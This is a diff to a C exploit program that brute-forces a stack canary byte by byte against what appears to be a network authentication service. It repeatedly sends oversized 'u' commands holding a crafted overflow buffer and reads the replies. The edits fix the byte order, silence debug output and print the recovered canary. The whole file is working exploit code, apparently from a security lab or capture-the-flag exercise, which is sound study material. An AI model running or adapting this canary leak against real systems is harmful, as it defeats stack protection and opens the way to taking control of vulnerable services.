@@ -17,14 +17,17 @@ int main() {
             "to continue with the exploit\n");
 
     getchar();
-
+    get_formatted("%*s");
+	
     uint64_t stack_canary = 0x0000000000000000;
     uint64_t current_byte = 0x00;
 
     // iterate over each byte of the canary
     for(int i = 1; i <= 8; i++) {
         current_byte = 0x00;
-        while(true) {
+        while(1) {
+            // fprintf(stderr, "Attach Now!");
+	    //	    getchar();
             // Buffer Size + DB + Cred + Canary - Password
             unsigned explsz = auth_db_cred_dist + 8 + 8 + 8 - 8;
             void* *expl = (void**)malloc(explsz);
@@ -32,16 +35,16 @@ int main() {
 
             // Set existing bytes
             uint8_t *canary_bytes = (uint8_t *)&stack_canary;
-            canary_bytes[8-i] = current_byte;
+            canary_bytes[i-1] = current_byte;
             expl[explsz/sizeof(void*)-1] = (void*)stack_canary;
 
-            get_formatted("%*s"); //Needed to clear out the Welcome message
+            // get_formatted("%*s"); //Needed to clear out the Welcome message
 
             put_str("p 1234567\n");
             send();
             get_formatted("%*s");
 
-            fprintf(stderr, "i: %d,\tByte: %lx,\tDetermined Canary: %lx\n", i, current_byte, stack_canary);
+            // fprintf(stderr, "i: %d,\tByte: %lx,\tDetermined Canary: %016lX\n", i, current_byte, stack_canary);
             put_str("u ");
             put_bin((char*)expl, explsz - 8 + i);
             put_str("\n");
@@ -58,7 +61,7 @@ int main() {
             current_byte = current_byte + 1;
         }
     }
-
+    fprintf(stderr, "Canary Computed: %016lx", stack_canary);
 
     // unsigned explsz = auth_db_cred_dist + 8 - 8 + 8;
     // void* *expl = (void**)malloc(explsz);
